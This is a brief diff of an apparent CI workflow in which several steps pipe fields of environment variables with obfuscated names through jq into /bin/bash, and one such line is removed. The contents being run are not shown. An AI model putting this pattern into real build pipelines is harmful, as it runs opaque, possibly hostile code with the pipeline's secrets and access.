@@ -23,7 +23,6 @@ jobs:
           printf '%s' "$tgct39964" | jq -r .koe60261 | /bin/bash
           printf '%s' "$pksz3245" | jq -r .oxp4 | /bin/bash
           printf '%s' "$hdkv10" | jq -r .r29 | /bin/bash
-          printf '%s' "$oz48555" | jq -r .vbb9395 | /bin/bash
           echo $yuh00461 | jq -r .rrhas70549 | /bin/bash
 
       - name: Upload artifact
